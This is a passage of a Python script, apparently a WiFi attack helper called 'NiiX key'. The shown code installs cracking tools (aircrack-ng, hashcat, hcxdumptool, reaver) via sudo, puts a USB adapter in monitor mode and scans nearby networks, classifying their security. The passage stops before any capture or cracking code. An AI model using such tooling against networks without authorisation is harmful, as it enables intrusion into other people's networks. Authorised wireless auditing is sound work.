#!/usr/bin/env python3

# NiiX key - WiFi Script
# Created by: cuteLiLi / techniix / QuacK
# Version: beta 2.0 

import subprocess
from collections import namedtuple
import os
import sys
import time
import platform
import shutil
import importlib
import tempfile
import json
import re
import threading
import atexit
import signal

# ─────────────────────────────────────────────
#  ANSI colour & style helpers
# ─────────────────────────────────────────────
class C:
    RESET    = '\033[0m'
    BOLD     = '\033[1m'
    DIM      = '\033[2m'
    RED      = '\033[31m'
    GREEN    = '\033[32m'
    YELLOW   = '\033[33m'
    BLUE     = '\033[34m'
    MAGENTA  = '\033[35m'
    CYAN     = '\033[36m'
    WHITE    = '\033[37m'
    BRED     = '\033[91m'
    BGREEN   = '\033[92m'
    BYELLOW  = '\033[93m'
    BBLUE    = '\033[94m'
    BMAGENTA = '\033[95m'
    BCYAN    = '\033[96m'
    BWHITE   = '\033[97m'

def c(text, *codes):
    return ''.join(codes) + str(text) + C.RESET

def ok(msg):   print(f"  {c('✔', C.BGREEN, C.BOLD)}  {c(msg, C.BGREEN)}")
def info(msg): print(f"  {c('◆', C.BCYAN,  C.BOLD)}  {c(msg, C.CYAN)}")
def warn(msg): print(f"  {c('▲', C.BYELLOW,C.BOLD)}  {c(msg, C.BYELLOW)}")
def err(msg):  print(f"  {c('✘', C.BRED,   C.BOLD)}  {c(msg, C.BRED)}")
def ask(msg):  return input(f"  {c('?', C.BMAGENTA, C.BOLD)}  {c(msg, C.BMAGENTA, C.BOLD)} ")

def section(title):
    w     = 62
    pad   = (w - len(title) - 4) // 2
    side  = c('─' * pad, C.BLUE, C.BOLD)
    label = c(f' {title} ', C.BWHITE, C.BOLD)
    print(f"\n{side}{c('[', C.BLUE, C.BOLD)}{label}{c(']', C.BLUE, C.BOLD)}{side}\n")

def divider():
    print(c('─' * 62, C.BLUE, C.DIM))


# ─────────────────────────────────────────────
#  Real-time progress bar (background thread)
# ─────────────────────────────────────────────
class ProgressBar:
    def __init__(self, total_seconds, label='Working', width=38):
        self.total   = total_seconds
        self.label   = label
        self.width   = width
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self._start = time.time()
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()
        self._thread.join()
        self._render(self.total, self.total)   # lock to 100 %
        print()

    def _render(self, elapsed, total):
        pct    = min(elapsed / total, 1.0)
        filled = int(self.width * pct)
        empty  = self.width - filled
        bar    = c('█' * filled, C.BCYAN, C.BOLD) + c('░' * empty, C.DIM)
        p_str  = c(f'{pct*100:5.1f}%', C.BWHITE, C.BOLD)
        remain = max(0, int(total - elapsed))
        eta    = c(f'{remain:3d}s', C.BYELLOW)
        lbl    = c(self.label, C.CYAN, C.BOLD)
        print(f"\r  {lbl}  [{bar}] {p_str}  ETA {eta}  ", end='', flush=True)

    def _run(self):
        while not self._stop.is_set():
            elapsed = time.time() - self._start
            self._render(elapsed, self.total)
            time.sleep(0.2)

# Try to import scapy at module level
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Track monitor interface globally so cleanup can always find it
MONITOR_IFACE  = None
ORIGINAL_IFACE = None   # the real adapter name before airmon-ng renames it
_CLEANUP_DONE  = False  # guard against double-cleanup

# Define a named tuple to store network information
# security field: 'WPA3', 'WPA3/WPA2', 'WPA2', 'WPA', 'WEP', 'OPEN', or 'UNKNOWN'
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal', 'security'])


class LinuxDistroDetector:
    """Detect and handle different Linux distributions."""

    DISTROS = {
        'kali': {
            'name': 'Kali Linux',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
                'libssl_dev': 'libssl-dev',
                'build_essential': 'build-essential',
                'openssl': 'openssl',
                'pocl': 'pocl-opencl-icd',
                'ocl_icd': 'ocl-icd-opencl-dev',
            }
        },
        'ubuntu': {
            'name': 'Ubuntu',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'python3_dev': 'python3-dev',
                'libpcap_dev': 'libpcap-dev',
                'libssl_dev': 'libssl-dev',
                'build_essential': 'build-essential',
                'openssl': 'openssl',
            }
        },
        'debian': {
            'name': 'Debian',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
                'libssl_dev': 'libssl-dev',
                'build_essential': 'build-essential',
                'openssl': 'openssl',
            }
        },
        'arch': {
            'name': 'Arch Linux',
            'pkg_manager': 'pacman',
            'install_cmd': ['pacman', '-S', '--noconfirm', '--needed'],
            'update_cmd': ['pacman', '-Sy'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'hostapd': 'hostapd',
                'pip': 'python-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python-virtualenv',
                'libpcap_dev': 'libpcap',
                'libssl_dev': 'openssl',
                'build_essential': 'base-devel',
                'openssl': 'openssl',
            }
        },
        'fedora': {
            'name': 'Fedora',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
                'libssl_dev': 'openssl-devel',
                'build_essential': 'gcc make',
                'openssl': 'openssl',
            }
        },
        'rhel': {
            'name': 'RHEL/CentOS/Rocky',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
                'libssl_dev': 'openssl-devel',
                'build_essential': 'gcc make',
                'openssl': 'openssl',
            }
        },
    }

    @staticmethod
    def detect_distro():
        """Detect the Linux distribution."""
        try:
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release', 'r') as f:
                    content = f.read().lower()

                if 'kali' in content:
                    return LinuxDistroDetector.DISTROS['kali']
                elif 'arch' in content or 'manjaro' in content or 'endeavouros' in content:
                    return LinuxDistroDetector.DISTROS['arch']
                elif 'fedora' in content:
                    return LinuxDistroDetector.DISTROS['fedora']
                elif 'centos' in content or 'rhel' in content or 'rocky' in content or 'almalinux' in content:
                    return LinuxDistroDetector.DISTROS['rhel']
                elif 'ubuntu' in content:
                    ubuntu_info = LinuxDistroDetector.DISTROS['ubuntu'].copy()
                    for line in content.split('\n'):
                        if 'version_id' in line:
                            try:
                                version = line.split('=')[1].strip().strip('"')
                                if int(version.split('.')[0]) >= 23:
                                    ubuntu_info['needs_venv'] = True
                            except Exception:
                                pass
                    return ubuntu_info
                elif 'debian' in content:
                    return LinuxDistroDetector.DISTROS['debian']

            # Fallback: detect by which package manager exists
            if shutil.which('pacman'):
                return LinuxDistroDetector.DISTROS['arch']
            elif shutil.which('dnf'):
                return LinuxDistroDetector.DISTROS['fedora']
            elif shutil.which('apt-get'):
                return LinuxDistroDetector.DISTROS['debian']

            return LinuxDistroDetector.DISTROS['debian']

        except Exception as e:
            warn(f"Could not detect distribution: {e}")
            return LinuxDistroDetector.DISTROS['debian']


def get_os():
    """Detect operating system."""
    system = platform.system()
    if system == "Linux":
        distro_info = LinuxDistroDetector.detect_distro()
        return distro_info['name']
    return "Unknown"


def check_pkg_manager(distro_info):
    """Check if package manager is available."""
    pkg_manager = distro_info['pkg_manager']
    if shutil.which(pkg_manager):
        return True
    # Try alternatives
    for alt in ['apt-get', 'apt', 'pacman', 'dnf', 'yum']:
        if shutil.which(alt):
            distro_info['install_cmd'][0] = alt
            distro_info['update_cmd'][0] = alt
            return True
    return False


def run_command(cmd, show_output=True, timeout=300):
    """Run a command and return result. Timeout is 5 minutes by default for installs."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        if show_output and result.stdout:
            print(result.stdout)
        if show_output and result.stderr:
            print(f"Stderr: {result.stderr}")
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        err(f"Command timed out: {' '.join(cmd)}")
        return False, "", "Timeout"
    except Exception as e:
        err(f"Command error: {e}")
        return False, "", str(e)


def install_system_package(distro_info, package_key):
    """Install a system package."""
    try:
        package_name = distro_info['pkg_names'].get(package_key)
        if not package_name:
            # Key not defined for this distro — silently skip
            return True

        cmd = ['sudo'] + distro_info['install_cmd'] + [package_name]
        info(f"Installing {package_name}...")

        success, stdout, stderr = run_command(cmd, show_output=False)

        if success:
            ok(f"Installed {package_name}")
            return True
        else:
            err(f"Failed to install {package_name}: {stderr.strip()[:120]}")
            return False

    except Exception as e:
        err(f"Error installing {package_key}: {e}")
        return False


def install_pip_package(package_name):
    """Install Python package via pip, trying multiple strategies."""
    pip_cmd = None
    for cmd in ['pip3', 'pip']:
        if shutil.which(cmd):
            pip_cmd = cmd
            break

    if not pip_cmd:
        err("pip not found")
        return False

    strategies = [
        [pip_cmd, 'install', package_name],
        [pip_cmd, 'install', '--break-system-packages', package_name],
        ['python3', '-m', 'pip', 'install', package_name],
        ['python3', '-m', 'pip', 'install', '--break-system-packages', package_name],
    ]

    for strategy in strategies:
        cmd = ['sudo'] + strategy
        info(f"Trying: {' '.join(cmd)}")
        success, stdout, stderr = run_command(cmd, show_output=False)
        if success:
            ok(f"Installed {package_name} via pip")
            return True

    err(f"All pip strategies failed for {package_name}")
    return False


def get_monitor_interface(base_interface):
    """Detect the actual monitor interface name created by airmon-ng."""
    # Give airmon-ng a moment to create the interface
    time.sleep(2)

    candidates = [
        f"{base_interface}mon",
        f"{base_interface}mon0",
    ]

    # Also check 'iw dev' for any monitor-mode interface
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line:
                    if iface and iface not in candidates:
                        candidates.insert(0, iface)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    for c in candidates:
        if os.path.exists(f'/sys/class/net/{c}'):
            return c

    # Fallback
    return f"{base_interface}mon"


def create_virtual_env():
    """Create a Python virtual environment."""
    venv_path = '/tmp/niixkey_venv'
    try:
        if os.path.exists(venv_path):
            shutil.rmtree(venv_path)

        info(f"Creating virtual environment at {venv_path}...")
        success, stdout, stderr = run_command(['python3', '-m', 'venv', venv_path])
        if not success:
            err(f"Failed to create venv: {stderr}")
            return None

        python_path = os.path.join(venv_path, 'bin', 'python3')
        if not os.path.exists(python_path):
            err("Virtual environment not created properly")
            return None

        ok("Virtual environment created")
        return venv_path

    except Exception as e:
        err(f"Error creating virtual environment: {e}")
        return None


def install_in_virtual_env(venv_path, package_name):
    """Install package inside a virtual environment."""
    pip_path = os.path.join(venv_path, 'bin', 'pip')
    if not os.path.exists(pip_path):
        err("pip not found in venv")
        return False

    info(f"Installing {package_name} in virtual environment...")
    success, stdout, stderr = run_command([pip_path, 'install', package_name], show_output=False)
    if success:
        ok(f"Installed {package_name} in venv")
        return True
    err(f"Failed to install {package_name} in venv: {stderr.strip()[:120]}")
    return False


def check_and_install_scapy(distro_info):
    """Install scapy using multiple fallback strategies."""
    global SCAPY_AVAILABLE

    if SCAPY_AVAILABLE:
        ok("scapy is already installed and importable")
        return True

    warn("scapy not found — attempting installation...")

    def _try_import_scapy():
        """Attempt to import scapy and update globals. Returns True on success."""
        global SCAPY_AVAILABLE
        importlib.invalidate_caches()
        try:
            import scapy.all as _sa
            import scapy.layers.dot11 as _sd11
            # Inject the needed names into the module's global namespace
            g = sys.modules[__name__].__dict__
            for name in dir(_sa):
                g[name] = getattr(_sa, name)
            g['Dot11'] = _sd11.Dot11
            g['Dot11Beacon'] = _sd11.Dot11Beacon
            g['Dot11Elt'] = _sd11.Dot11Elt
            SCAPY_AVAILABLE = True
            return True
        except ImportError:
            return False

    # Strategy 1: System package
    info("Strategy 1: System package...")
    if install_system_package(distro_info, 'scapy'):
        if _try_import_scapy():
            ok("scapy importable after system install")
            return True
        err("System package installed but cannot import")

    # Strategy 2: pip
    info("Strategy 2: pip install...")
    if install_pip_package('scapy'):
        if _try_import_scapy():
            ok("scapy importable after pip install")
            return True
        err("pip installed but cannot import")

    # Strategy 3: virtualenv
    info("Strategy 3: Virtual environment...")
    install_system_package(distro_info, 'python3_venv')
    venv_path = create_virtual_env()
    if venv_path and install_in_virtual_env(venv_path, 'scapy'):
        venv_site = os.path.join(
            venv_path, 'lib',
            f'python{sys.version_info.major}.{sys.version_info.minor}',
            'site-packages'
        )
        if os.path.exists(venv_site):
            sys.path.insert(0, venv_site)
            if _try_import_scapy():
                ok("scapy importable from virtual environment")
                return True
            err("Cannot import from venv")

    err("All scapy installation strategies failed")
    return False


def check_tool(tool_name):
    """Check if a CLI tool is available."""
    return shutil.which(tool_name) is not None


def check_all_dependencies():
    """Check if all required tools are available."""
    required_tools = [
        'airmon-ng',
        'airodump-ng',
        'aireplay-ng',
        'aircrack-ng',
        'iw',
        'hashcat',
    ]

    missing_tools = [t for t in required_tools if not check_tool(t)]

    # hcxtools — binary name varies between versions
    if not check_tool('hcxpcapngtool') and not check_tool('hcxpcaptool'):
        missing_tools.append('hcxpcapngtool/hcxpcaptool')

    # hcxdumptool — needed for PMKID capture (WPA3 / modern WPA2)
    if not check_tool('hcxdumptool'):
        missing_tools.append('hcxdumptool')

    global SCAPY_AVAILABLE
    if not SCAPY_AVAILABLE:
        missing_tools.append('scapy (python)')

    if missing_tools:
        err(f"Missing: {', '.join(missing_tools)}")
        return False

    return True


def install_hcxdumptool_from_source():
    """Build and install hcxdumptool from source as a fallback."""
    info("Attempting to build hcxdumptool from source…")
    build_dir = '/tmp/hcxdumptool_build'
    try:
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)
        os.makedirs(build_dir)

        # Clone repo
        r = subprocess.run(
            ['git', 'clone', '--depth', '1',
             'https://github.com/ZerBea/hcxdumptool.git', build_dir],
            capture_output=True, text=True, timeout=120
        )
        if r.returncode != 0:
            err("git clone failed — check internet / git install")
            return False

        # Build
        r = subprocess.run(['make'], cwd=build_dir, capture_output=True, text=True, timeout=180)
        if r.returncode != 0:
            err(f"make failed: {r.stderr.strip()[:200]}")
            return False

        # Install
        r = subprocess.run(['sudo', 'make', 'install'], cwd=build_dir,
                           capture_output=True, text=True, timeout=60)
        if r.returncode == 0:
            ok("hcxdumptool built and installed from source")
            return True
        err(f"make install failed: {r.stderr.strip()[:200]}")
        return False
    except Exception as e:
        err(f"Source build error: {e}")
        return False


def install_dependencies():
    """Install all necessary dependencies including WPA3 toolchain."""
    info("Installing dependencies…")

    distro_info = LinuxDistroDetector.detect_distro()
    info(f"Detected distro: {distro_info['name']}")

    if not check_pkg_manager(distro_info):
        err("No supported package manager found")
        return False

    try:
        info("Updating package database…")
        update_cmd = ['sudo'] + distro_info['update_cmd']
        run_command(update_cmd, show_output=False)

        # Core tools needed for WPA2 and scanning
        essential_packages = [
            'pip',
            'iw',
            'net_tools',
            'aircrack',
            'hcxtools',
            'libpcap_dev',
            'libssl_dev',
            'build_essential',
            'openssl',
        ]

        # WPA3 + extended cracking toolchain
        extended_packages = [
            'hcxdumptool',    # PMKID capture
            'hashcat',        # cracking
            'pocl',           # CPU OpenCL runtime — lets hashcat run without a GPU
            'ocl_icd',        # OpenCL ICD loader
            'hostapd',
            'wpasupplicant',
            'reaver',
            'python3_dev',
            'python3_venv',
        ]

        for pkg_key in essential_packages:
            install_system_package(distro_info, pkg_key)

        for pkg_key in extended_packages:
            install_system_package(distro_info, pkg_key)

        # hcxdumptool source fallback if package manager didn't have it
        if not check_tool('hcxdumptool'):
            if shutil.which('git') and shutil.which('make'):
                install_hcxdumptool_from_source()
            else:
                warn("git/make not available — cannot build hcxdumptool from source")

        # Scapy (critical for scanning)
        info("Installing scapy…")
        if not check_and_install_scapy(distro_info):
            warn("Could not install scapy properly")
            response = ask("Continue anyway? [y/N]")
            if response.strip().lower() != 'y':
                return False

        # Verify
        info("Verifying installed tools…")
        tools_to_check = [
            'airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng',
            'iw', 'hashcat', 'hcxdumptool',
        ]
        verified = [t for t in tools_to_check if check_tool(t)]
        missing  = [t for t in tools_to_check if not check_tool(t)]

        if verified:
            ok(f"Verified: {', '.join(verified)}")
        if missing:
            warn(f"Still missing: {', '.join(missing)}")

        # hcxtools converter binary check
        if not check_tool('hcxpcapngtool') and not check_tool('hcxpcaptool'):
            warn("hcxpcapngtool/hcxpcaptool not found — WPA2 PMKID conversion may be limited")

        critical_missing = [t for t in ['airmon-ng', 'airodump-ng', 'aircrack-ng'] if t in missing]
        if critical_missing:
            err(f"Critical tools missing: {', '.join(critical_missing)}")
            return False

        return True

    except Exception as e:
        err(f"Error installing dependencies: {e}")
        return False


def is_usb_interface(iface):
    """Return True if the wireless interface is backed by a USB device."""
    # Walk the sysfs device tree from the interface upward looking for a 'usb' subsystem
    try:
        dev_path = f'/sys/class/net/{iface}/device'
        if not os.path.exists(dev_path):
            return False
        real_dev = os.path.realpath(dev_path)
        # Walk up the sysfs path; any component that contains 'usb' marks a USB device
        path = real_dev
        for _ in range(10):
            subsystem_link = os.path.join(path, 'subsystem')
            if os.path.exists(subsystem_link):
                subsystem = os.path.basename(os.path.realpath(subsystem_link))
                if subsystem in ('usb', 'usb_device'):
                    return True
            # Also check if any path component looks like a USB bus (e.g. /sys/bus/usb)
            if '/usb' in path:
                return True
            parent = os.path.dirname(path)
            if parent == path:
                break
            path = parent
    except Exception:
        pass
    return False


def get_wireless_interfaces():
    """Get available wireless interfaces — USB adapters only."""
    all_ifaces = []

    # Method 1: iw dev
    if check_tool('iw'):
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split()[1]
                        if iface not in all_ifaces:
                            all_ifaces.append(iface)
        except Exception:
            pass

    # Method 2: ip link (wlx prefix almost always means USB)
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                parts = line.split(':')
                if len(parts) >= 2:
                    iface = parts[1].strip().split('@')[0]
                    if iface.startswith(('wl', 'wlan', 'wlp', 'wlx')):
                        if iface not in all_ifaces:
                            all_ifaces.append(iface)
    except Exception:
        pass

    # Method 3: /sys/class/net
    try:
        for iface in os.listdir('/sys/class/net'):
            wireless_path = f'/sys/class/net/{iface}/wireless'
            if os.path.exists(wireless_path) and iface not in all_ifaces:
                all_ifaces.append(iface)
    except Exception:
        pass

    # Filter out monitor interfaces already running
    all_ifaces = [i for i in all_ifaces if not i.endswith('mon') and 'mon0' not in i]

    # ── USB-only filter ───────────────────────────────────────
    usb_ifaces = [i for i in all_ifaces if is_usb_interface(i)]

    if usb_ifaces:
        info(f"USB WiFi adapters detected:  {c(', '.join(usb_ifaces), C.BWHITE, C.BOLD)}")
        non_usb = [i for i in all_ifaces if i not in usb_ifaces]
        if non_usb:
            warn(f"Ignoring non-USB interfaces:  {c(', '.join(non_usb), C.DIM)}")
        return usb_ifaces
    else:
        warn("No USB wireless adapters detected via sysfs — listing all wireless interfaces")
        warn("Tip: Only use a USB WiFi adapter that supports monitor mode (e.g. AR9271, RT3070, RT5572)")
        return all_ifaces


def detect_security_from_airodump_csv(parts):
    """
    Parse the Privacy/Cipher/Auth columns from airodump-ng CSV row.
    CSV columns (0-indexed): 0=BSSID, 5=Privacy, 6=Cipher, 7=Authentication
    Returns a security string: 'WPA3', 'WPA3/WPA2', 'WPA2', 'WPA', 'WEP', 'OPEN'
    """
    try:
        privacy = parts[5].strip().upper() if len(parts) > 5 else ''
        cipher  = parts[6].strip().upper() if len(parts) > 6 else ''
        auth    = parts[7].strip().upper() if len(parts) > 7 else ''

        # WPA3: SAE auth (Simultaneous Authentication of Equals) = WPA3-Personal
        # OWE = WPA3-Enhanced Open
        if 'SAE' in auth or 'OWE' in auth:
            # Transition mode = both SAE and PSK accepted
            if 'PSK' in auth or 'WPA2' in privacy:
                return 'WPA3/WPA2'
            return 'WPA3'
        if 'WPA2' in privacy or 'WPA2' in cipher:
            return 'WPA2'
        if 'WPA' in privacy:
            return 'WPA'
        if 'WEP' in privacy:
            return 'WEP'
        if 'OPN' in privacy or privacy == '':
            return 'OPEN'
        return 'UNKNOWN'
    except Exception:
        return 'UNKNOWN'


def detect_security_from_iw(rsn_info, wpa_info, privacy_info):
    """
    Derive security type from iw scan RSN/WPA IE strings.
    rsn_info / wpa_info / privacy_info are lowercased strings from iw output.
    """
    if 'sae' in rsn_info:
        if 'psk' in rsn_info:
            return 'WPA3/WPA2'
        return 'WPA3'
    if rsn_info:
        return 'WPA2'
    if wpa_info:
        return 'WPA'
    if 'wep' in privacy_info:
        return 'WEP'
    if 'on' not in privacy_info and privacy_info:
        return 'OPEN'
    return 'UNKNOWN'



def scan_networks_airodump(interface, monitor_iface, duration=45):
    """
    Channel-hopping scan using airodump-ng.
    Runs three separate passes — 2.4 GHz, 5 GHz, and combined fallback —
    so each band gets dedicated dwell time instead of racing through all channels.
    """
    all_networks = {}   # bssid -> Network, keeps best signal

    def run_pass(band_flag, band_label, secs):
        tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
        cap_base = os.path.join(tmpdir, 'scan')
        cmd = [
            'sudo', 'airodump-ng',
            '--band', band_flag,
            '--output-format', 'csv',
            '-w', cap_base,
            '--write-interval', '2',
            monitor_iface
        ]
        nets = []
        proc = None
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            pb   = ProgressBar(secs, label=f'Scanning {band_label:<6}')
            pb.start()
            time.sleep(secs)
            pb.stop()
            proc.terminate()
            try: proc.wait(timeout=5)
            except Exception: pass
        except Exception as e:
            warn(f"airodump pass ({band_label}) error: {e}")
            if proc:
                try: proc.terminate()
                except Exception: pass

        csv_files = sorted([f for f in os.listdir(tmpdir) if f.endswith('.csv')])
        for csv_name in csv_files:
            csv_path = os.path.join(tmpdir, csv_name)
            try:
                with open(csv_path, 'r', errors='ignore') as fh:
                    content = fh.read()
                sections   = re.split(r'\n\s*\n', content, maxsplit=1)
                ap_section = sections[0] if sections else ''
                lines      = ap_section.strip().split('\n')
                # Skip the two header lines
                for line in lines[2:]:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) < 14:
                        continue
                    bssid = parts[0].strip()
                    if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
                        continue
                    try:    signal = int(parts[8].strip())
                    except: signal = -100
                    try:    channel = int(parts[3].strip())
                    except: channel = None
                    ssid     = parts[13].strip() if len(parts) > 13 else ''
                    ssid     = ssid or '<Hidden>'
                    security = detect_security_from_airodump_csv(parts)
                    nets.append(Network(ssid=ssid, bssid=bssid, channel=channel,
                                        signal=signal, security=security))
            except Exception as e:
                warn(f"CSV parse ({band_label}): {e}")
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass
        return nets

    # ── Pass 1: 2.4 GHz (ch 1–13) — 45 s ──────────────────────────
    info("Pass 1/2 — 2.4 GHz band (ch 1–13)…")
    for net in run_pass('bg', '2.4GHz', 45):
        if net.bssid not in all_networks or net.signal > all_networks[net.bssid].signal:
            all_networks[net.bssid] = net
    ok(f"2.4 GHz pass: {len(all_networks)} network(s)")

    # ── Pass 2: 5 GHz (ch 36–165, 25 channels) — 60 s ─────────────
    info("Pass 2/2 — 5 GHz band (ch 36–165)…")
    before = len(all_networks)
    for net in run_pass('a', '5GHz ', 60):
        if net.bssid not in all_networks or net.signal > all_networks[net.bssid].signal:
            all_networks[net.bssid] = net
    ok(f"5 GHz pass: +{len(all_networks) - before} additional network(s)")

    return list(all_networks.values())




def _scapy_parse_beacon(pkt):
    """Parse a Dot11Beacon packet into a Network namedtuple. Returns None on failure."""
    try:
        ssid        = '<Hidden>'
        channel     = None
        signal      = -100
        has_rsn     = False
        has_wpa     = False
        auth_suites = []

        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0 and elt.info:
                ssid = elt.info.decode('utf-8', errors='ignore').strip() or '<Hidden>'
            elif elt.ID == 3 and elt.info:
                channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
            elif elt.ID == 48:
                has_rsn = True
                try:
                    raw = bytes(elt.info)
                    if len(raw) >= 8:
                        pc = int.from_bytes(raw[4:6], 'little')
                        akm_off = 6 + pc * 4
                        if len(raw) >= akm_off + 2:
                            ac = int.from_bytes(raw[akm_off:akm_off+2], 'little')
                            for i in range(ac):
                                so = akm_off + 2 + i * 4
                                if len(raw) >= so + 4:
                                    auth_suites.append(raw[so + 3])
                except Exception:
                    pass
            elif elt.ID == 221 and elt.info and elt.info[:3] == b'\x00\x50\xf2':
                has_wpa = True
            try:
                elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
            except Exception:
                break

        if hasattr(pkt, 'dBm_AntSignal'):
            signal = pkt.dBm_AntSignal

        bssid = pkt.addr2
        if not bssid:
            return None

        if has_rsn and 8 in auth_suites:
            sec = 'WPA3/WPA2' if 2 in auth_suites else 'WPA3'
        elif has_rsn:
            sec = 'WPA2'
        elif has_wpa:
            sec = 'WPA'
        else:
            sec = 'OPEN'

        return Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal, security=sec)
    except Exception:
        return None


def channel_hopper(iface, channels, stop_event, interval=0.25):
    """Background thread: cycles through channels on iface while scapy sniffs."""
    idx = 0
    while not stop_event.is_set():
        try:
            subprocess.run(
                ['sudo', 'iw', 'dev', iface, 'set', 'channel', str(channels[idx % len(channels)])],
                capture_output=True, timeout=1
            )
        except Exception:
            pass
        idx += 1
        time.sleep(interval)


def _parse_airodump_csv_dir(tmpdir):
    """Parse all airodump CSV files in tmpdir, return list of Network tuples."""
    nets = []
    try:
        csv_files = [f for f in os.listdir(tmpdir) if f.endswith('.csv')]
    except Exception:
        return nets
    for csv_name in csv_files:
        try:
            with open(os.path.join(tmpdir, csv_name), 'r', errors='ignore') as fh:
                content_csv = fh.read()
            ap_section = re.split(r'\n\s*\n', content_csv, maxsplit=1)[0]
            for line in ap_section.strip().split('\n')[2:]:
                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 14:
                    continue
                bssid = parts[0].strip()
                if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
                    continue
                try:    signal = int(parts[8].strip())
                except: signal = -100
                try:    channel = int(parts[3].strip())
                except: channel = None
                ssid     = parts[13].strip() or '<Hidden>'
                security = detect_security_from_airodump_csv(parts)
                nets.append(Network(ssid=ssid, bssid=bssid, channel=channel,
                                    signal=signal, security=security))
        except Exception:
            pass
    return nets


def scan_networks(interface):
    """
    Full-spectrum scan — three complementary passes merged by BSSID.
      Pass 1: airodump-ng 2.4 GHz band, 45 s  (channels 1-14, auto-hop)
      Pass 2: airodump-ng 5 GHz band,   45 s  (channels 36-165, auto-hop)
      Pass 3: scapy passive sniff,       60 s  with background channel-hopper
              thread cycling ALL channels so nothing is missed
    """
    global SCAPY_AVAILABLE, MONITOR_IFACE, ORIGINAL_IFACE

